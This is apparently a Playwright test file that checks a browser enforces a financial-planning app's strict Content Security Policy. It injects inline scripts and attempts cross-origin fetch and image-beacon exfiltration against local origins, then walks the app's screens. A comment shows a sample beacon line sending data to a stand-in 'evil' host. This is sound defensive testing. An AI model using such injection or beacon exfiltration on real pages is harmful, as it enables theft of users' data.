import { test, expect, type Page } from '@playwright/test'
import { SETTLED_RESULT } from './reviewSurface'
import { driveIntakeToResult } from './intakeDrive'
import { copy, slots } from '../src/ui/copy'
import { roughWindow, ROUGH_WINDOW_YEARS } from '../src/engine/reference/roughSequence'

/**
 * Proves a REAL browser enforces the strict CSP shipped in `vercel.json` — the in-memory decrypted
 * model's only guard against an injected page script (at-rest crypto does nothing for cleartext in
 * the JS heap). `scripts/__tests__/csp-headers.test.ts` proves the JSON *string*; this proves the
 * browser *behaviour*. Served by `scripts/serve-dist-with-headers.ts` via the config's webServer:
 *   - baseURL (127.0.0.1:4180) = the ENFORCED origin (real CSP header).
 *   - CONTROL_ORIGIN (4181)    = the SAME dist/ with NO CSP header.
 *
 * The control test is the anti-false-pass keystone: the SAME injection that is BLOCKED on the
 * enforced origin must EXECUTE on the control origin — otherwise a silently-broken injector would
 * make the blocked assertion vacuous.
 */
const CONTROL_ORIGIN = 'http://127.0.0.1:4181'
/** The ENFORCED origin — the config's `baseURL`, where the build's own chunks and workers are served. */
const ENFORCED_ORIGIN = 'http://127.0.0.1:4180'

interface CspViolation {
  readonly violatedDirective: string
  readonly blockedURI: string
}

declare global {
  interface Window {
    __inlineExecuted?: boolean
    __cspViolations?: CspViolation[]
  }
}

/**
 * Installed in the MAIN page world BEFORE navigation (addInitScript, not an in-evaluate promise), so
 * it observes the page's REAL CSP violations and survives the navigation with the flag pre-seeded
 * false — distinguishing "blocked" (stays false) from "never ran".
 */
async function installCollector(page: Page): Promise<void> {
  await page.addInitScript(() => {
    window.__inlineExecuted = false
    window.__cspViolations = []
    document.addEventListener('securitypolicyviolation', (e) => {
      window.__cspViolations?.push({ violatedDirective: e.violatedDirective, blockedURI: e.blockedURI })
    })
  })
}

/**
 * The SHARED injector — identical code path on enforced and control so a broken technique cannot
 * yield a false PASS. It runs in page.evaluate's isolated world, but the <script> element it appends
 * joins the MAIN document and is therefore evaluated against the page's CSP.
 */
async function injectInlineScript(page: Page): Promise<void> {
  await page.evaluate(() => {
    const s = document.createElement('script')
    s.textContent = 'window.__inlineExecuted = true'
    document.body.appendChild(s)
  })
}

const inlineExecuted = (page: Page) => page.evaluate(() => window.__inlineExecuted)
const violations = (page: Page) => page.evaluate(() => window.__cspViolations ?? [])


test.describe('CSP — real browser enforcement', () => {
  test("blocks a runtime-injected inline <script> (script-src 'self')", async ({ page }) => {
    await installCollector(page)
    await page.goto('/')
    await injectInlineScript(page)

    // PRIMARY proof: the inline script never executed.
    expect(await inlineExecuted(page)).toBe(false)

    // CORROBORATION: the browser reported a script-src violation (Chromium uses the granular
    // `script-src-elem` for an inline element, hence startsWith rather than ===).
    const v = await violations(page)
    expect(v.some((x) => x.violatedDirective.startsWith('script-src'))).toBe(true)

    // The enforced origin actually SENT the strict policy (guards a harness that dropped the CSP,
    // which would make the assertions above vacuous, and pins out any future `unsafe-inline` drift).
    const csp = (await page.request.get('/')).headers()['content-security-policy'] ?? ''
    expect(csp).toContain("script-src 'self'")
    expect(csp).not.toContain("'unsafe-inline'")
  })

  test('CONTROL: the same injection DOES execute when no CSP is served', async ({ page }) => {
    await installCollector(page)
    await page.goto(`${CONTROL_ORIGIN}/`)
    await injectInlineScript(page)

    // If this is false the injector is broken ⇒ the enforced test was a false pass.
    expect(await inlineExecuted(page)).toBe(true)
    expect(await violations(page)).toHaveLength(0)
  })

  test("blocks cross-origin network exfil (connect-src 'self')", async ({ page }) => {
    await installCollector(page)
    await page.goto('/')
    // The in-scope attack is exfil of the in-memory model via fetch/XHR/beacon. connect-src 'self'
    // must block a cross-origin request. The control origin (:4181) is a genuinely different origin,
    // so no internet is needed; the CSP check fires the violation BEFORE any network egress.
    await page.evaluate(async (target) => {
      try {
        await fetch(target, { mode: 'no-cors' })
      } catch {
        /* the CSP rejection is expected */
      }
    }, `${CONTROL_ORIGIN}/`)
    expect((await violations(page)).some((x) => x.violatedDirective.startsWith('connect-src'))).toBe(true)
  })

  test('CONTROL: the same cross-origin fetch raises no connect-src violation with no CSP', async ({ page }) => {
    await installCollector(page)
    await page.goto(`${CONTROL_ORIGIN}/`)
    await page.evaluate(async (target) => {
      try {
        await fetch(target, { mode: 'no-cors' })
      } catch {
        /* a network/CORS failure, NOT a CSP violation */
      }
    }, 'http://127.0.0.1:4180/')
    // Proves the enforced violation above is caused by the CSP, not intrinsic to the cross-origin fetch.
    expect((await violations(page)).some((x) => x.violatedDirective.startsWith('connect-src'))).toBe(false)
  })

  test("blocks a cross-origin image-beacon exfil (img-src 'self' data:)", async ({ page }) => {
    await installCollector(page)
    await page.goto('/')
    // A fetch-free exfil channel connect-src does NOT cover: `new Image().src = 'https://evil/?d=' + data`.
    // img-src governs sub-resource image loads, so a cross-origin image must fire an img-src violation.
    await page.evaluate(
      (target) =>
        new Promise<void>((resolve) => {
          const img = new Image()
          img.onload = () => resolve()
          img.onerror = () => resolve() // a CSP block manifests as a load error; the violation fires first
          img.src = `${target}/probe.png`
        }),
      CONTROL_ORIGIN,
    )
    expect((await violations(page)).some((x) => x.violatedDirective.startsWith('img-src'))).toBe(true)
  })

  test('CONTROL: the same image-beacon raises no img-src violation with no CSP', async ({ page }) => {
    await installCollector(page)
    await page.goto(`${CONTROL_ORIGIN}/`)
    await page.evaluate(
      (target) =>
        new Promise<void>((resolve) => {
          const img = new Image()
          img.onload = () => resolve()
          img.onerror = () => resolve()
          img.src = `${target}/probe.png`
        }),
      'http://127.0.0.1:4180',
    )
    expect((await violations(page)).some((x) => x.violatedDirective.startsWith('img-src'))).toBe(false)
  })

  test("engine module Web Worker constructs + round-trips under worker-src 'self' — through the REAL intake", async ({ page }) => {
    // This walk is a full intake + TWO engine round trips (the strip's provisional reading, then the
    // Result's). Playwright's 30 s default cannot hold it on a 4-vCPU runner, and the 60 / 90 s waits
    // below are dead letters without a test budget above them (a matcher timeout never clamps to the
    // test deadline — the test dies first with a bare "Test timeout", and no custom message prints).
    // Scoped to THIS test, not the config: the fast control arms keep the default so a hang there
    // still reads as one (playwright.fit.config.ts carries the same hardware reasoning).
    test.setTimeout(180_000)
    // RETARGETED at D1 (the U0 smoke readout is gone): drives the real product
    // path — cold start → the guided intake → a live provisional engine reading
    // — under the ENFORCED policy. Strictly stronger than the smoke arm: the
    // worker constructs at module eval, the React surface renders under
    // style-src 'self', and the 2000-path engine round-trips a transferred
    // buffer into the answer strip.
    await installCollector(page)
    await driveIntakeToResult(page)
    // Act 6 · RC4: the walk lands on the home (Dashboard → Snapshot), whose fan is the real chart under the real
    // headers: Highcharts in styled mode, its fills reaching it through the CSSOM (`--b9-fan-outer`, written once at
    // start-up), never a runtime <style>. The old band's chart-text layer left with the answer page.
    await expect(page.getByRole('heading', { level: 1, name: copy.shellPageSnapshot })).toBeVisible({ timeout: 90_000 })
    const outer = page.locator('[data-card="fan"] [data-chart="fan"] .b9-fan-outer .highcharts-area').first()
    await expect(outer, 'the home drew no fan — retarget this probe at whichever chart the home carries').toBeAttached({ timeout: 90_000 })
    const painted = await outer.evaluate((el) => ({
      fill: getComputedStyle(el).fill,
      written: document.documentElement.style.getPropertyValue('--b9-fan-outer').trim(),
    }))
    expect(painted.written, 'the CSSOM write never landed on the root under the enforced CSP').not.toBe('')
    expect(painted.fill, 'the fan’s outer range painted nothing: the CSSOM custom property did not reach the chart').not.toMatch(/^(none|rgba\(0, 0, 0, 0\))$/)
    expect(await page.evaluate(() => document.querySelectorAll('style').length), 'a chart injected a <style> element').toBe(0)

    // No worker-src/script-src/style-src violation anywhere along the real path — the chart render
    // above included.
    const v = await violations(page)
    expect(v.some((x) => /worker-src|script-src|style-src/.test(x.violatedDirective))).toBe(false)
  })

  test("the POOLED solve's workers construct under worker-src 'self' — a coordinator + the eval workers, alive and violation-free", async ({ page }) => {
    // The intake walk (above) + the invite → the pool spawn. The solve itself runs for minutes and is
    // never awaited: this arm proves the pool's members construct and LIVE under the enforced policy.
    test.setTimeout(240_000)
    // The pool's size is a function of the device (`poolSizeFor`: every core but two). Pin the device
    // to 4 logical cores so the arm is P = 2 on every runner — CDP-injected, so the CSP never sees it,
    // and before the app's module evaluates (the engine client reads it once, at construction).
    await page.addInitScript(() => {
      Object.defineProperty(Navigator.prototype, 'hardwareConcurrency', { configurable: true, get: () => 4 })
    })
    await installCollector(page)
    await driveIntakeToResult(page)
    await expect(page.locator(SETTLED_RESULT), 'no final-tier verdict — the invite cannot mount').toBeAttached({ timeout: 120_000 })
    expect(page.workers(), 'before the solve: the spine worker alone').toHaveLength(1)

    // Act 6 · RC8: Tax → Tax Strategies' empty state: the goal on the page's own radio, then Find.
    await page.getByRole('navigation', { name: copy.shellModulesLabel }).getByRole('link', { name: copy.shellModuleTax, exact: true }).click()
    const find = page.getByRole('button', { name: copy.taxStratFind, exact: true })
    await expect(find, 'Find never mounted').toBeVisible({ timeout: 60_000 })
    await page.getByRole('radio', { name: new RegExp(copy.goalPayLessTaxLabel) }).check()
    await find.click()
    await expect(page.locator('[data-calculating]'), 'the solve never went pending').toBeAttached({ timeout: 30_000 })

    // The spine + ONE coordinator + TWO eval workers, all through the one `new URL` literal.
    await expect.poll(() => page.workers().length, { message: 'the pool never spawned', timeout: 30_000 }).toBe(4)
    // ALIVE, not merely constructed: a member that failed to load under the policy fires its `error`
    // event, and the lane tears EVERY member down and retries on the spine (page.workers() → 1). The
    // window is far past a cached chunk's load; the solve is still minutes from done.
    await page.waitForTimeout(10_000)
    expect(page.workers(), 'a pool member died — the lane tore down').toHaveLength(4)
    await expect(page.locator('[data-calculating]'), 'the solve settled inside the window — the arm proved nothing about a LIVE pool').toBeAttached()

    const v = await violations(page)
    expect(v.some((x) => /worker-src|script-src/.test(x.violatedDirective))).toBe(false)
  })

  test('the shell loads under the enforced CSP: the home, Probability and its Action Items tray, Confidence, Cash Flows, Social Security, Health Care, Tax Strategies, every interim tab and both its menus, no violation, and no request outside the build’s own files', async ({ page }) => {
    // Act 6 · RC2 (plan 6, section 3.1's Verification; the workbench room's arm before it, U6 to U15), re-pointed at RC4:
    // the real intake lands on the home (Dashboard → Snapshot), the shell's lazy chunk and its styles load with it on the
    // served build, Probability draws its rings and its two balance bars (Highcharts again), and every interim tab is
    // visited. ANY violation reds (not a directive subset), and so does any request that leaves the build's own origin:
    // the act adds no network call. The table runs both views on the build's own engine worker, each one short run: the
    // steady view lands first, then the future select shows the rough one, each read by its own words over its own rows; a
    // drill opens and goes back, the CSV downloads (a blob built in the page), and the Accounts tab opens. The facts
    // page opens and closes one step sheet; Probability's Action Items tray (RC4b: a Base UI collapsible, its Edit drawer a
    // portaled dialog) runs one what-if through its Refresh; the lock menu (a portaled Base UI menu)
    // opens and closes; at a phone width the menu (a portaled Base UI dialog that animates) moves the page. The way home
    // is the wordmark.
    test.setTimeout(180_000)
    await installCollector(page)
    const outside: string[] = []
    page.on('request', (r) => {
      const url = new URL(r.url())
      if (url.protocol === 'data:' || url.protocol === 'blob:') return
      if (url.origin !== ENFORCED_ORIGIN) outside.push(r.url())
    })
    await driveIntakeToResult(page)
    // Act 6 · RC4: the walk's end lands on the home, Dashboard → Snapshot (no answer page, no door), the app's first
    // Highcharts chart under the real header (the fan, its lazy chunk, highcharts-more and the accessibility module, its
    // styled-mode CSS and its hover tooltip).
    await expect(page.getByRole('heading', { level: 1, name: copy.shellPageSnapshot })).toBeVisible({ timeout: 120_000 })
    expect(await page.evaluate(() => history.state)).toEqual({ b9: 'workspace', n: 1 })
    expect(new URL(page.url()).hash).toBe('#/dashboard/snapshot')
    await expect(page.locator('main.result'), 'exactly one main.result in the shell').toHaveCount(1)
    const fan = page.locator('[data-card="fan"] [data-chart="fan"]')
    await expect(fan.locator('.highcharts-series-group'), 'the fan never drew under the CSP').toBeAttached({ timeout: 60_000 })
    await expect(fan.locator('.highcharts-data-label text', { hasText: copy.snapshotFanOuterWords }), 'the fan’s band words').toBeAttached()
    await fan.evaluate((el) => el.scrollIntoView({ block: 'center' }))
    const plot = (await fan.locator('.highcharts-plot-background').boundingBox())!
    await page.mouse.move(plot.x + plot.width * 0.45, plot.y + plot.height / 2)
    await page.mouse.move(plot.x + plot.width / 2, plot.y + plot.height / 2, { steps: 5 })
    await expect(fan.locator('.highcharts-tooltip'), 'the fan’s tooltip never showed').toBeVisible()
    expect(await page.evaluate(() => document.querySelectorAll('style').length), 'the fan injected a <style> element').toBe(0)
    await page.mouse.move(0, 0)
    // Retirement → Analysis → Probability (RC4): the two rings and the two balance bars (each its own Highcharts chart)
    // once the settled answer's what-if side reads the plan itself; the left picker (a portaled Base UI select) opened
    // and closed.
    await page.getByRole('navigation', { name: copy.shellModulesLabel }).getByRole('link', { name: copy.shellModuleRetirement, exact: true }).click()
    await expect(page.getByRole('heading', { level: 1, name: copy.analysisTitle })).toBeVisible({ timeout: 30_000 })
    expect(new URL(page.url()).hash).toBe('#/retirement/analysis/probability')
    await expect(page.locator('[data-ring-half="compared"]'), 'the plan’s ring never drew').toBeVisible({ timeout: 60_000 })
    // The walk's household reads off track with a $0 middle balance, so its bars give way to their words (the bar charts'
    // own CSP proof is the kit probe's Highcharts arm and the home's fan above); either way, one of the two stands.
    await expect(page.locator('[data-bar="compared"] .highcharts-series-group, [data-bar-none]').first(), 'neither the bar nor its words').toBeAttached({
      timeout: 60_000,
    })
    await page.locator('[data-half="alternative"]').getByRole('combobox').click()
    await expect(page.getByRole('listbox'), 'the picker never opened').toBeVisible()
    await page.keyboard.press('Escape')
    await expect(page.getByRole('listbox')).toHaveCount(0)
    expect(await page.evaluate(() => document.querySelectorAll('style').length), 'Probability injected a <style> element').toBe(0)
    // The plan list drawer (RC5): the pencil beside the right picker opens it; Done closes it.
    await page.getByRole('button', { name: copy.planListOpenLabel }).click()
    const planList = page.getByRole('dialog', { name: copy.planListTitle })
    await expect(planList, 'the plan list never opened').toBeVisible()
    expect(await page.evaluate(() => document.querySelectorAll('style').length), 'the plan list injected a <style> element').toBe(0)
    await planList.getByRole('button', { name: copy.planListDone }).click()
    await expect(planList).toHaveCount(0)
    // Confidence (RC7): the fan full size, and on the retired route the run-out chart lined up under it (a Highcharts area
    // chart, the clone's first, rebuilt on the fan's plot box); its legend toggled and back. Then Probability again.
    await page.getByRole('tab', { name: copy.confidenceTab }).click()
    await expect(page.getByRole('heading', { level: 2, name: copy.confidenceChartTitle })).toBeVisible({ timeout: 30_000 })
    expect(new URL(page.url()).hash).toBe('#/retirement/analysis/confidence')
    const confFan = page.locator('[data-confidence] [data-chart="fan"]')
    await expect(confFan.locator('.highcharts-series-group'), 'Confidence’s fan never drew under the CSP').toBeAttached({ timeout: 30_000 })
    await expect(page.locator('[data-chart="runout"] .highcharts-series-group, [data-runout-stopgap]').first(), 'neither the run-out chart nor its stopgap').toBeAttached({ timeout: 30_000 })
    await confFan.locator('.highcharts-legend-item', { hasText: copy.snapshotFanOuter }).click()
    await confFan.locator('.highcharts-legend-item', { hasText: copy.snapshotFanOuter }).click()
    expect(await page.evaluate(() => document.querySelectorAll('style').length), 'Confidence injected a <style> element').toBe(0)
    await page.getByRole('tab', { name: copy.probabilityTab }).click()
    await expect(page.locator('[data-ring-half="compared"]'), 'back on Probability').toBeVisible({ timeout: 30_000 })
    // On to Retirement → Cash Flows (RC6: the kit's DataTable, its Selects, a drill, the Accounts tab, and the CSV handed
    // to the browser as a file built in the page, a blob, with no request).
    await page.getByRole('navigation', { name: copy.shellPagesLabel }).getByRole('link', { name: copy.shellPageCashFlows, exact: true }).click()
    await expect(page.getByRole('heading', { level: 1, name: copy.shellPageCashFlows })).toBeVisible({ timeout: 30_000 })
    expect(new URL(page.url()).hash).toBe('#/retirement/cash-flows')

    const firstLine = page.locator('[data-cash-flows-lines] p').first()
    const frame = page.locator('[data-table-frame]')
    await expect(frame, 'the steady view’s rows never landed').toBeVisible({ timeout: 60_000 })
    await expect(firstLine, 'the steady view’s words').toHaveText(copy.workbenchSteadyWhat)
    await page.locator('[data-cash-flows-controls]').getByRole('combobox', { name: copy.workbenchViewLegend }).click()
    await page.getByRole('option', { name: copy.workbenchViewRough, exact: true }).click()
    const roughStart = roughWindow().startYear
    await expect(firstLine, 'the rough view’s words').toHaveText(
      slots.workbenchRoughWhat(roughStart, roughStart + ROUGH_WINDOW_YEARS - 1, ROUGH_WINDOW_YEARS),
    )
    await expect(frame, 'the rough view’s rows').toBeVisible()
    await expect(page.locator('[data-table-frame][data-busy]')).toHaveCount(0)
    await frame.locator('thead button').first().click()
    await expect(page.locator('[data-cash-flows-title]')).toContainText('/')
    await page.locator('[data-cash-flows-title]').getByRole('button', { name: copy.cashFlowsTabSummary }).click()
    const [download] = await Promise.all([page.waitForEvent('download'), page.getByRole('button', { name: copy.cashFlowsDownloadLabel }).click()])
    expect(download.suggestedFilename(), 'the CSV arrives as a file').toMatch(/^cash-flows-.*\.csv$/)
    await page.getByRole('tab', { name: copy.cashFlowsTabAccounts }).click()
    await expect(page.getByRole('combobox', { name: copy.cashFlowsAccountsLabel })).toBeVisible()
    expect(await page.evaluate(() => document.querySelectorAll('style').length), 'Cash Flows injected a <style> element').toBe(0)

    // Retirement → Social Security (RC9): its strategy runs on their own slots (the walk's household, 65 and 63, both
    // claiming at 67, always has a choice), the yearly pairs, the running totals with the crossing's ring (a scatter
    // mark), Summary's bars on a category axis, and the filing steps in the tray.
    await page.getByRole('navigation', { name: copy.shellPagesLabel }).getByRole('link', { name: copy.shellPageSocialSecurity, exact: true }).click()
    await expect(page.getByRole('heading', { level: 1, name: copy.shellPageSocialSecurity })).toBeVisible({ timeout: 30_000 })
    expect(new URL(page.url()).hash).toBe('#/retirement/social-security')
    await expect(page.locator('[data-chart="claims-annual"] .highcharts-series-group'), 'the yearly pairs never drew').toBeAttached({ timeout: 120_000 })
    await page.getByRole('button', { name: copy.claimsChartAnnual }).click()
    await page.getByRole('menuitemradio', { name: copy.claimsChartCumulative, exact: true }).click()
    await expect(page.locator('[data-chart="claims-cumulative"] .highcharts-series-group'), 'the running totals never drew').toBeAttached({ timeout: 60_000 })
    await page.getByRole('tab', { name: copy.claimsTabSummary }).click()
    await expect(page.locator('[data-chart="claims-summary"] .highcharts-series-group'), 'Summary never drew').toBeAttached({ timeout: 120_000 })
    await page.getByRole('button', { name: copy.trayHandle, exact: true }).click()
    await expect(page.locator('[data-claims-steps]'), 'the filing steps never opened').toBeVisible()
    await page.getByRole('button', { name: copy.trayHandle, exact: true }).click()
    expect(await page.evaluate(() => document.querySelectorAll('style').length), 'Social Security injected a <style> element').toBe(0)

    // Retirement → Health Care (RC10): its four small charts (each its own Highcharts chart, the cliff's bracket a line
    // series) or the page's own words where the walk's household prices no health premiums, and its Action Items tray.
    await page.getByRole('navigation', { name: copy.shellPagesLabel }).getByRole('link', { name: copy.shellPageHealthCare, exact: true }).click()
    await expect(page.getByRole('heading', { level: 1, name: copy.shellPageHealthCare })).toBeVisible({ timeout: 30_000 })
    expect(new URL(page.url()).hash).toBe('#/retirement/health-care')
    await expect(page.locator('[data-chart="health-extras"] .highcharts-series-group, [data-health-page]').first(), 'neither the charts nor the page’s words').toBeAttached({ timeout: 120_000 })
    if ((await page.locator('[data-health-charts]').count()) > 0) {
      await page.getByRole('button', { name: copy.trayHandle, exact: true }).click()
      await expect(page.locator('[data-health-tray]'), 'the health tray never opened').toBeVisible()
      await page.getByRole('button', { name: copy.trayHandle, exact: true }).click()
    }
    expect(await page.evaluate(() => document.querySelectorAll('style').length), 'Health Care injected a <style> element').toBe(0)

    // Tax → Tax Strategies (RC8): its folder tabs (the page's own state), the empty state's goal radios and Find, and
    // Summary's waiting words before a solve; the solve's own workers are the pooled arm's above.
    await page.getByRole('navigation', { name: copy.shellModulesLabel }).getByRole('link', { name: copy.shellModuleTax, exact: true }).click()
    await expect(page.getByRole('heading', { level: 1, name: copy.shellPageTaxStrategies })).toBeVisible({ timeout: 30_000 })
    expect(new URL(page.url()).hash).toBe('#/tax/strategies')
    await expect(page.getByRole('button', { name: copy.taxStratFind, exact: true }), 'Find never showed').toBeVisible()
    await page.getByRole('radio', { name: new RegExp(copy.goalLeaveMoreLabel) }).check()
    await expect(page.locator('[data-heir-bracket]'), 'the heirs’ bracket beside the leave-more pick').toBeVisible()
    await page.getByRole('tab', { name: copy.taxStratTabSummary }).click()
    await expect(page.locator('[data-summary="waiting"]'), 'Summary’s words before a solve').toBeVisible()
    await page.getByRole('tab', { name: copy.taxStratTabStrategies }).click()
    expect(await page.evaluate(() => document.querySelectorAll('style').length), 'Tax Strategies injected a <style> element').toBe(0)

    // The lock menu: a portaled menu, opened and closed by Escape.
    await page.getByRole('button', { name: new RegExp(`^${copy.lockMenuLabel}`) }).click()
    await expect(page.getByRole('menu'), 'the lock menu never opened').toBeVisible()
    await page.keyboard.press('Escape')
    await expect(page.getByRole('menu')).toHaveCount(0)

    // The facts page (Profile), one press away, and one step sheet (a portaled sheet, its motion, and an intake step's
    // body in the shell's chunk), opened and closed through Done.
    await page.getByRole('navigation', { name: copy.shellModulesLabel }).getByRole('link', { name: copy.shellModuleProfile, exact: true }).click()
    await expect(page.getByRole('heading', { name: copy.workbenchFactsChoices, exact: true }), 'the facts page never showed').toBeVisible()
    await expect(page.locator('.wb-facts__section').first()).toBeVisible()
    await page.getByRole('button', { name: slots.workbenchFactsEditName(copy.workbenchFactsPeople), exact: true }).click()
    const sheet = page.getByRole('dialog', { name: copy.workbenchFactsPeople, exact: true })
    await expect(sheet, 'the step sheet never opened').toBeVisible()
    await sheet.getByRole('button', { name: copy.workbenchFactsDone, exact: true }).click()
    await expect(sheet, 'the step sheet never closed').toHaveCount(0)

    // Probability's Action Items tray (Retirement → Analysis, RC4b): one what-if, run on the build's own engine worker (its
    // many-futures run and both named futures) by the tray's Refresh. Spending is offered to every household: its first
    // figure set $1,000 lower with Enter (pending, marked), then Refresh, then the difference line speaks the two counts.
    // The Edit drawer (a portaled, animated dialog) opens and closes.
    await page.getByRole('navigation', { name: copy.shellModulesLabel }).getByRole('link', { name: copy.shellModuleRetirement, exact: true }).click()
    await expect(page.locator('main.result[data-shell-screen="probability"]')).toBeAttached()
    await page.getByRole('button', { name: copy.trayHandle, exact: true }).click()
    const tray = page.locator('#b9-action-items')
    await expect(tray, 'the tray never opened').toBeVisible()
    const spend = tray.locator('[data-tray-group="spending"] input[inputmode="decimal"]').first()
    const planSpend = Number((await spend.inputValue()).replace(/[^0-9]/g, ''))
    expect(planSpend, '[test setup] the spending figure reads').toBeGreaterThan(1_000)
    await spend.fill(String(planSpend - 1_000))
    await spend.press('Enter')
    await expect(tray.locator('[data-changed]').first(), 'the edit waits in the tray, marked').toBeVisible()
    await tray.locator('[data-tray-refresh]').click()
    await expect
      .poll(async () => ((await page.locator('[data-difference] span').first().textContent()) ?? '').trim(), { message: 'the what-if’s difference line never spoke', timeout: 60_000 })
      .not.toMatch(new RegExp(`^$|^${copy.probabilityNoChanges.slice(0, 20)}`))
    await expect(page.locator('[data-half="alternative"] [aria-busy="true"]'), 'the what-if’s run never settled').toHaveCount(0, { timeout: 60_000 })
    await tray.getByRole('button', { name: copy.trayEdit, exact: true }).click()
    const edit = page.getByRole('dialog', { name: copy.trayEditTitle })
    await expect(edit, 'the Edit drawer never opened').toBeVisible()
    await page.keyboard.press('Escape')
    await expect(edit).toHaveCount(0)
    expect(await page.evaluate(() => document.querySelectorAll('style').length), 'the tray injected a <style> element').toBe(0)
    // Shut again by its handle (open, it would become the phone's full-height sheet when the window narrows below).
    await page.getByRole('button', { name: copy.trayHandle, exact: true }).click()
    await expect(tray, 'the tray never shut').toBeHidden()

    // At a phone width the menu (a portaled, animated dialog) reaches Cash Flows and closes on the choice.
    await page.setViewportSize({ width: 390, height: 844 })
    await page.getByRole('button', { name: copy.shellMenuOpen, exact: true }).click()
    const menu = page.getByRole('dialog', { name: copy.shellMenuTitle })
    await expect(menu, 'the phone menu never opened').toBeVisible()
    await menu.getByRole('link', { name: copy.shellPageCashFlows, exact: true }).click()
    await expect(menu).toHaveCount(0)
    await expect(page.locator('main.result[data-shell-screen="cash-flows"]')).toBeAttached()

    // The way home: the wordmark goes to Snapshot (a page move, so the unkept what-if survives and nothing is asked).
    await page.getByRole('link', { name: copy.shellHomeLabel }).click()
    await expect(page.locator('main.result[data-shell-screen="snapshot"]')).toBeAttached({ timeout: 30_000 })
    await expect(page.getByText(copy.shellLeaveWhatIf, { exact: true })).toHaveCount(0)

    expect(await violations(page)).toEqual([])
    expect(outside, 'a request left the build’s own origin').toEqual([])
  })

  /**
   * Act 6 · RC1 (plan docs/plans/6-rightcapital-ui-plan.md, section 2.3): the new stack under the real header, before any
   * screen is built; from RC2 (section 3.1) the probe page (`kit-probe.html`, a second build entry) wears the KIT
   * (`src/ui/kit`) under `CSPProvider disableStyleElements`, and this arm opens every kit part that portals or animates:
   * the drawer (with its record steps, Escape, and focus back on its opener, the one real-browser read of insight 071),
   * the Add menu and a flyout, the picker, the chart title's menu, the folder tabs, the tooltip, the toast, the switch,
   * the checkbox, and the Action Items tray (a panel on the laptop, a full-height sheet on the phone); plus the slider,
   * the scroll area, the TanStack data table and the Highcharts chart in styled mode with the accessibility module and
   * the shared pattern defs. ANY violation reds (the part that injected a `<style>` or a style attribute is the one
   * being opened), and so does any request off the build's origin. The fallbacks a red points at: React Aria
   * (components), Recharts (charts). The same arm reads the cascade the colour-blind cue rests on: the hatched series and
   * its legend symbol fill from `url("#b9-hatch")`, and series 0 fills with palette.ts's own hex, so neither
   * `highcharts.css` nor Highcharts' default palette won.
   */
  test('the kit probe: every kit part opened under the enforced CSP — no violation, no request off the origin, the chart cascade intact', async ({ page }) => {
    test.setTimeout(120_000)
    await installCollector(page)
    const outside: string[] = []
    page.on('request', (r) => {
      const url = new URL(r.url())
      if (url.protocol === 'data:' || url.protocol === 'blob:') return
      if (url.origin !== ENFORCED_ORIGIN) outside.push(r.url())
    })
    const response = await page.goto('/kit-probe.html')
    // The probe was served the strict policy (a harness that dropped it would make every assertion below vacuous).
    const csp = response?.headers()['content-security-policy'] ?? ''
    expect(csp, 'the probe page was served without the strict CSP').toContain("style-src 'self'")
    expect(csp).not.toContain("'unsafe-inline'")
    await expect(page.getByRole('heading', { name: 'Kit probe' })).toBeVisible()

    const insideRcRoot = 'xpath=ancestor::*[contains(concat(" ", normalize-space(@class), " "), " rc-root ")]'

    // The drawer (a Base UI Dialog docked right): open, step a record, close on Escape with focus back on its opener
    // (insight 071: jsdom's teardown order is not the browser's, so this is the real read), then again through Cancel.
    const opener = page.getByRole('button', { name: 'Open the drawer' })
    await opener.click()
    const drawer = page.getByRole('dialog', { name: 'Salary' })
    await expect(drawer).toBeVisible()
    await expect(drawer.locator(insideRcRoot)).toHaveCount(1)
    await expect(drawer.getByRole('button', { name: 'Delete' })).toBeVisible()
    await drawer.getByRole('button', { name: 'The next record' }).click()
    await expect(drawer.locator('[data-probe="record"]')).toHaveText('Record 2 of 3')
    await page.keyboard.press('Escape')
    await expect(drawer).toHaveCount(0)
    await expect(opener, 'focus did not return to the drawer’s opener').toBeFocused()
    await opener.click()
    await expect(drawer).toBeVisible()
    await drawer.getByRole('button', { name: 'Cancel' }).click()
    await expect(drawer).toHaveCount(0)

    // Select: open the list, pick the second item.
    await page.getByRole('combobox').click()
    await expect(page.getByRole('listbox')).toBeVisible()
    await expect(page.getByRole('listbox').locator(insideRcRoot)).toHaveCount(1)
    await page.getByRole('option', { name: 'Years' }).click()
    await expect(page.getByRole('listbox')).toHaveCount(0)
    await expect(page.getByRole('combobox')).toContainText('Years')

    // Slider: one key press moves it.
    const thumb = page.getByRole('slider')
    const before = await thumb.getAttribute('aria-valuenow')
    await thumb.focus()
    await thumb.press('ArrowRight')
    await expect(thumb).not.toHaveAttribute('aria-valuenow', before ?? '')

    // Toast: shown, then dismissed.
    await page.getByRole('button', { name: 'Show a toast' }).click()
    await expect(page.getByText('Your plan is saved on this device.')).toBeVisible()
    // Base UI hides a toast's close from the accessibility tree until the stack is hovered or focused (it expands).
    await page.getByText('Your plan is saved on this device.').hover()
    await page.getByRole('button', { name: 'Dismiss' }).click()
    await expect(page.getByText('Your plan is saved on this device.')).toHaveCount(0)

    // The Add menu: the blue panel, a flyout, a pick that closes both.
    await page.getByRole('button', { name: 'Add', exact: true }).click()
    const addMenu = page.getByRole('menu').first()
    await expect(addMenu).toBeVisible()
    await expect(addMenu.locator(insideRcRoot)).toHaveCount(1)
    await page.getByRole('menuitem', { name: 'Property' }).click()
    await expect(page.getByRole('menuitem', { name: 'Rental property' })).toBeVisible()
    await page.getByRole('menuitem', { name: 'Rental property' }).click()
    await expect(page.getByRole('menu')).toHaveCount(0)
    await expect(page.locator('[data-probe="added"]')).toHaveText('Added: Rental property')

    // The chart title's menu, the folder tabs, the switch, the checkbox.
    await page.getByRole('button', { name: 'Savings over time' }).click()
    await page.getByRole('menuitemradio', { name: 'Income sources' }).click()
    await expect(page.getByRole('menu')).toHaveCount(0)
    await expect(page.getByRole('heading', { name: 'Income sources' })).toBeVisible()
    await page.getByRole('tab', { name: 'Confidence' }).click()
    await expect(page.getByRole('tab', { name: 'Confidence' })).toHaveAttribute('aria-selected', 'true')
    await page.getByRole('tab', { name: 'Probability' }).click()
    const future = page.getByRole('switch', { name: 'Future dollars' })
    await future.click()
    await expect(future).toHaveAttribute('aria-checked', 'true')
    const joint = page.getByRole('checkbox', { name: 'Held jointly' })
    await joint.click()
    await expect(joint).toHaveAttribute('aria-checked', 'false')

    // The tooltip: hovered, its words shown in an .rc-root portal.
    await page.getByRole('button', { name: 'About the annual increase' }).hover()
    const tip = page.getByText('How much the figure grows each year.')
    await expect(tip).toBeVisible()
    await expect(tip.locator(insideRcRoot)).toHaveCount(1)
    await page.mouse.move(0, 0)
    await expect(tip).toHaveCount(0)

